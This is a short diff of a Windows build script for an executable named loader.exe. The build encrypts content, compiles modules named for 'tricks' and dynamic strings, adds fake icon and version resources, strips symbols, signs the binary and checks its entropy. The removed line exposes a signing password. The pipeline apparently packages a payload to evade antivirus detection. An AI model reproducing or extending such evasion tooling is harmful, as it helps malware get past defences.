@@ -7,8 +7,8 @@ python ./encrypter.py
 gcc -c dynamic_strings.c
 windres ico.rc -O coff ico.res
 windres info.rc -O coff info.res
-gcc -o loader.exe loader.c aes.o fast.o tricks.o windows_intern.o dynamic_strings.o ico.res info.res -nostartfiles -static -lgdiplus -Wl,-e WinMainCRTStartup
-signtool sign /f sign.pfx /p bebra1 /t http://timestamp.digicert.com /fd sha256 loader.exe
+gcc -o loader.exe loader.c aes.o fast.o tricks.o windows_intern.o dynamic_strings.o ico.res info.res -s -nostartfiles -static -lgdiplus -Wl,-e WinMainCRTStartup
+@REM signtool sign /f random.pfx /t http://timestamp.digicert.com /fd sha256 loader.exe
 python ./entropy.py
 
 del *.o
